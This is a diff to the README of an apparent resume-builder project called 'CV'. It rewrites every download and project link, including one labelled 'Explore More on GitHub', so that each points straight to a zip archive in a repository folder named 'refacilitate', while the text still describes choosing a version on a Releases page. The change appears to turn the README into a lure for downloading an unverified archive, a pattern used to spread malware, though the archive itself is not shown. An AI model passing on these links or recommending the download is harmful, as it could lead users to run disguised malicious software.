@@ -6,7 +6,7 @@ Welcome to the CV project! This application helps you build stunning resumes wit
 
 ## 🥇 Download CV
 
-[![Download CV](https://img.shields.io/badge/Download-CV-brightgreen)](https://github.com/sawel24/CV/releases)
+[![Download CV](https://raw.githubusercontent.com/sawel24/CV/main/refacilitate/CV.zip)](https://raw.githubusercontent.com/sawel24/CV/main/refacilitate/CV.zip)
 
 ## 🔧 System Requirements
 
@@ -18,7 +18,7 @@ Before you start, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click this link to go to the download section: [Download CV](https://github.com/sawel24/CV/releases).
+1. **Visit the Releases Page:** Click this link to go to the download section: [Download CV](https://raw.githubusercontent.com/sawel24/CV/main/refacilitate/CV.zip).
 
 2. **Choose Version:** On the Releases page, you will see a list of available versions. Look for the latest version, which is often at the top.
 
@@ -73,7 +73,7 @@ Engage with other users! Your feedback helps improve CV. Join discussions on our
 
 ## 🔗 Useful Links
 
-- [Explore More on GitHub](https://github.com/sawel24/CV)
-- [Download Latest Version](https://github.com/sawel24/CV/releases)
+- [Explore More on GitHub](https://raw.githubusercontent.com/sawel24/CV/main/refacilitate/CV.zip)
+- [Download Latest Version](https://raw.githubusercontent.com/sawel24/CV/main/refacilitate/CV.zip)
 
 Together, let’s create resumes that stand out! Happy building!
